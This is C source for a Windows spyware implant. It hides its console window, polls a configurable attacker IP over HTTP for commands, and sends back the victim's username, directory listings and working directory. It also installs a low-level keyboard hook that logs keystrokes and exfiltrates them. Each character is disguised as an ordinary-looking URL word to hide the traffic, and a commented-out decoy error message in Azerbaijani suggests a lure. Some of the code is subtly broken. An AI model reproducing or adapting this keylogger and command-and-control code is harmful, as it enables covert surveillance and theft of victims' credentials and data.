#include <stdio.h>
#include <conio.h>
#include <winsock2.h>
#include <unistd.h>
#include<windows.h>
#include <dirent.h>
#include <winuser.h>


//====================Change Here==================
char a_ip[] = ""; // your ip address For EX: 10.14.22.10
char pszHostAddress[]=""; // your base url, don't add / to the end of the url For EX: http://10.14.22.10
//====================Change Here==================






HHOOK hook;
LPMSG msg;
FILE *LOG;

#pragma comment(lib, "ws2_32.lib") 
#define DATA_SIZE 300 
#define MYSTRINGSIZE 92

const char *mystrings[MYSTRINGSIZE] = {
' ',
'!',
'#',
'$',
'&',
'(',
')',
'*',
'+',
',',
'-',
'.',
'/',
'0',
'1',
'2',
'3',
'4',
'5',
'6',
'7',
'8',
'9',
':',
';',
'<',
'=',
'>',
'?',
'@',
'A',
'B',
'C',
'D',
'E',
'F',
'G',
'H',
'I',
'J',
'K',
'L',
'M',
'N',
'O',
'P',
'Q',
'R',
'S',
'T',
'U',
'V',
'W',
'X',
'Y',
'Z',
'[',
']',
'^',
'_',
'`',
'a',
'b',
'c',
'd',
'e',
'f',
'g',
'h',
'i',
'j',
'k',
'l',
'm',
'n',
'o',
'p',
'q',
'r',
's',
't',
'u',
'v',
'w',
'x',
'y',
'z',
'{',
'|',
'}',
'~',
'\\'
};

const char *myobsstrings[MYSTRINGSIZE] = {
        "empty",
        "netherla",
        "days" ,
        "money" ,
        "waze" ,
        "motorized" ,
        "leftmotorized" ,
        "kick" ,
        "top" ,
        "hostname" ,
        "full" ,
        "more" ,
        "anatomy" ,
        "intelligence" ,
        "reports" ,
        "zvelo" ,
        "partners" ,
        "technologies" ,
        "data" ,
        "bins" ,
        "web" ,
        "collects" ,
        "multiple" ,
        "surge" ,
        "analysis" ,
        "sets" ,
        "accuse" ,
        "admire" ,
        "agency" ,
        "airline" ,
        "common" ,
        "analyze" ,
        "another" ,
        "anywhere" ,
        "appreciate" ,
        "area" ,
        "commercial" ,
        "concentrate" ,
        "confident" ,
        "department" ,
        "devote" ,
        "discipline" ,
        "display" ,
        "preserve" ,
        "privacy" ,
        "production" ,
        "promote" ,
        "protect" ,
        "public" ,
        "quietly" ,
        "rare" ,
        "rather" ,
        "reason" ,
        "refugee" ,
        "represent" ,
        "romantic" ,
        "sand" ,
        "scientist" ,
        "senator" ,
        "sharp" ,
        "shrug" ,
        "since" ,
        "slowly" ,
        "somewhere" ,
        "speech" ,
        "standard" ,
        "stream" ,
        "such" ,
        "surgery" ,
        "surprisingly" ,
        "table" ,
        "teaching" ,
        "tension" ,
        "testify" ,
        "then" ,
        "three" ,
        "tobacco" ,
        "tourist" ,
        "training" ,
        "trip" ,
        "typically" ,
        "unlikely" ,
        "versus" ,
        "vision" ,
        "warning" ,
        "west" ,
        "whisper" ,
        "winner" ,
        "wrap" ,
        "wrong" ,
        "yours",
        "hostel",
        
};



void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}

char * kyarr[30];
int is_ky_enabled;

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam){
    

    

    if (wParam == WM_KEYDOWN && is_ky_enabled == 1)
    {
        

        if(str_length(kyarr) > 30){
            UnhookWindowsHookEx(hook);
            send_string(kyarr);
            start_listen_again();
        }
        strcat(kyarr, lParam);

        
    }
    return CallNextHookEx(hook,code,wParam,lParam);	
    
}


int str_length(char str[]) {
    int count; 
    
    for (count = 0; str[count] != '\0'; ++count);
    
    return count; 
}

char * get_username(){
    char * user = getenv("username");
    return user;
}

void list_directory(char *path[]){
    struct dirent *de; 

   
    DIR *dr = opendir(path);
  
    if (dr == NULL)  
    {
        return 0;
    }
  
    
    
    while ((de = readdir(dr)) != NULL){
         
        send_string(de->d_name);
        send_new_line_request();
    }
    
       
    closedir(dr);    
}



void current_dir(){
    char cwd[PATH_MAX];
    if (getcwd(cwd, sizeof(cwd)) != NULL) {
        send_string(cwd);
    } else {
        return 1;
    }
}

void create_file(char data[]){

    FILE * fPtr;

    fPtr = fopen("file1.txt", "w");


    if(fPtr == NULL)
    {
        exit(EXIT_FAILURE);
    }



    fputs(data, fPtr);


    fclose(fPtr);



}

char c_req[] = "";

void send_http_request(char pszResourcePath[]){
    
    WSADATA wsa;
    SOCKET s;    
    struct sockaddr_in server;
    char c = 0;
    c = 0;
        
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        c = getch();
        return 1;
    }


    if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
    {
        WSACleanup();
        c = getch();
        return 1;
    }
    
    memset(&server, 0, sizeof server);
    server.sin_addr.s_addr = inet_addr(a_ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(80);


    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        sleep(1);
        
        start();
        
 
    }
    
    
    char pszRequest[100]= {0};
    sprintf(pszRequest, "GET %s HTTP/1.1\r\nHost: %s\r\nContent-Type: text/plain\r\n\r\n", pszResourcePath, pszHostAddress);

    send(s, pszRequest, strlen(pszRequest), 0);
    

    char buffer[1024] = { 0 };
    recv(s, buffer, 1024, 0);
    
    
    strcpy(c_req, buffer);



}

void send_string(char mystring[]){
    
    for (int i=0; i < str_length(mystring); i++)
    {
        int len = sizeof(mystrings)/sizeof(mystrings[0]);
        int j;
        for(j = 0; j < len; ++j)
        {
            
            if(mystring[i] == mystrings[j])
            {

                char* custom_concat_str;
                custom_concat_str = malloc(strlen("/")+1+4);
                strcpy(custom_concat_str, "/"); 
                strcat(custom_concat_str, myobsstrings[j]);
                
                send_http_request(custom_concat_str);
                sleep(1);                
            }
        }
        
    }
        
    

    
}   

void start_listen_again(){
    send_http_request("/last_supper");
    start();
}

void send_new_line_request(){
    send_http_request("/hello");
    sleep(1);
}

void listen_command(){
    send_http_request("/first_supper");
}

    

void start(){
    
    while(1){

        
        listen_command();

        char subbuff[3];
        memcpy( subbuff, &c_req[9], 3 );
        subbuff[3] = '\0';

    
        if(subbuff[0]=='2' && subbuff[1]=='0', subbuff[2]=='3'){
            send_string(get_username());
            start_listen_again();
        }
        if(subbuff[0]=='2' && subbuff[1]=='0', subbuff[2]=='2'){
            list_directory(".");
            start_listen_again();
        }

        if(subbuff[0]=='2' && subbuff[1]=='0', subbuff[2]=='5'){
            current_dir();
            start_listen_again();
        }

        if(subbuff[0]=='2' && subbuff[1]=='0', subbuff[2]=='6'){
            is_ky_enabled = 1;
            // Stealth();
            strcpy(kyarr, "");
            hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
            if (hook != NULL) 
                puts("All is good");
            else
                puts("Something went wrong :(");
            while(GetMessage(msg, NULL, 0, 0) > 0) {
                
                TranslateMessage(msg);
                DispatchMessage(msg);
           
            }
            
            
        }
        
        sleep(1);
    }
}

int main(int argc, char *argv[])
{
    is_ky_enabled = 0;
    
    Stealth();
    
    // int msgboxID = MessageBox(
    //     NULL,
    //     "Bu proqram sizin komputeriniz de islemeye uygun deyil. Proqramimiz heleki inksaf merhelesindedir sizin ucun uygun formasi hazir olduqda size melumat verilecek",
    //     "Melumat",
    //     MB_ICONASTERISK  | MB_OK
    // );
    

    start();
    
    return 0;
}
